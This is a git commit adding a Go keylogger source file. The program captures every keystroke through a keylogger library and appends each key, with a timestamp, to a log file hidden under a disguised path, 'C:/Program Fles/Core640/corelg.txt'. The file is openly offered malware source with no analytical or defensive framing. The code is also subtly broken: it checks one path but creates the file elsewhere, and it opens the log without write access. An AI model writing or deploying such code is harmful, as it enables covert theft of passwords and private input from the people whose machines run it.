cc778def10d14e43e31237f0b41ebbd853f2aac0
cfayetmarius <83921581+cfayetmarius@users.noreply.github.com>
2021-05-09 20:52:52 +0200

    Add files via upload

---
+++ keylogger.go
@@ -0,0 +1,50 @@
+		package main
+
+import(
+	keys"github.com/kindlyfire/go-keylogger"
+	"time"
+	"fmt"
+	"os"
+	"log"
+	"strconv"
+)
+
+func check(err error) {
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+func strconverter(nb int) string {
+	return(strconv.Itoa(nb)) 
+}
+
+func gettimestring() string{
+	t := time.Now()
+	return(strconverter(t.Year())+"/"+t.Month().String()+"/"+strconverter(t.Day())+"|"+strconverter(t.Hour())+":"+strconverter(t.Minute())+":"+strconverter(t.Second()))
+}
+
+func exist(name string) bool {
+    if _, err := os.Stat(name); err != nil {
+        if os.IsNotExist(err) {
+            return false
+        }
+    }
+    return true
+}
+
+func main() {
+	if !exist("C:/Program Fles/Core640/corelg.txt") {
+		_, err := os.Create("corelg.txt")
+		check(err)
+	}
+	kl := keys.NewKeylogger()	
+	for {
+		key := kl.GetKey()
+		if !key.Empty {
+			f, err2 := os.OpenFile("C:/Program Fles/Core640/corelg.txt", os.O_APPEND,0644)
+			check(err2)
+			f.WriteString(gettimestring()+"  :   "+string(key.Rune)+"\n")
+		}
+	}	
+}
